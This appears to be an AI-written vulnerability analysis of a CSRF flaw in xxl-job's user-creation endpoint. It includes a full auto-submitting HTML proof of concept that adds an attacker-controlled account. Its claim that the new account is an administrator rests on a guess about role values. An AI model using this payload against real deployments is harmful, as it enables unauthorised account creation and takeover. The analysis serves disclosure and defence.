Based on the provided content, here's an analysis of the vulnerability:

**Root Cause:** The vulnerability stems from a lack of Cross-Site Request Forgery (CSRF) protection in the `/xxl-job-admin/user/add` endpoint of the `xxl-job` application.

**Weaknesses/Vulnerabilities:**
*   **CSRF Vulnerability:** The application does not implement sufficient checks to ensure that requests to add a user originate from a legitimate user session. This allows an attacker to craft a malicious web page that, when visited by an authenticated admin, sends a forged request to add a new user.

**Impact of Exploitation:**
*   **Privilege Escalation:** An attacker can add a new administrator account using the vulnerable endpoint, granting themselves full access to the application. This can lead to further malicious activities such as data exfiltration, denial of service, or complete control over the application.
*  **Account Compromise:** The attacker can create a new account with administrative privileges that they control, which can be used to further compromise the system and/or maintain persistence within the application.

**Attack Vectors:**
*   **Malicious Web Page:** An attacker crafts a malicious HTML page containing JavaScript code that sends a POST request to the vulnerable `/xxl-job-admin/user/add` endpoint. The crafted request adds a new administrative user.
*   **Social Engineering:** The attacker must trick a logged-in administrator into visiting the crafted malicious page, typically through phishing or other social engineering methods.

**Required Attacker Capabilities/Position:**
*   **External Network Access:** The attacker needs to be able to serve a malicious web page to a logged-in administrator.
*   **Administrator Session:** The attack requires a valid authenticated session of a user with administrative privileges on the `xxl-job` application. This session must still be active when the administrator accesses the malicious page.

**Technical Details (from the provided code):**
The provided HTML snippet shows the malicious code designed to exploit the CSRF vulnerability. It creates a form with hidden fields containing the username, password, role, and permission values and submits it to the vulnerable endpoint.

```html
<html><body>
<script type="text/javascript">
function post(url,fields) {
  var p = document.createElement("form");
  p.action = url;
  p.innerHTML = fields;
  p.target = "_self";
  p.method = "post";
  document.body.appendChild(p);
  p.submit();
}
function csrf_hack() {
  var fields;
  fields += "<input type='hidden' name='username' value='test1' />";
  fields += "<input type='hidden' name='password' value='test1' />";
  fields += "<input type='hidden' name='role'    value='0' />";
  fields += "<input type='hidden' name='permission' value='1' />";
  var url = "http://172. 18.71.41:8090/xxl-job-admin/user/add";
  post(url,fields);
}
window.onload = function() { csrf_hack();}
</script>
</body></html>
```
The JavaScript function `csrf_hack()` sets the username, password, role, and permission for the new user. The `role` with value `0` is likely an administrative role, and `permission` with value `1` likely grants permissions to this user. The attacker controls the user name and password of the new user.

**Additional Notes:**

*   The provided HTML code gives the exact way an attacker can exploit the CSRF.
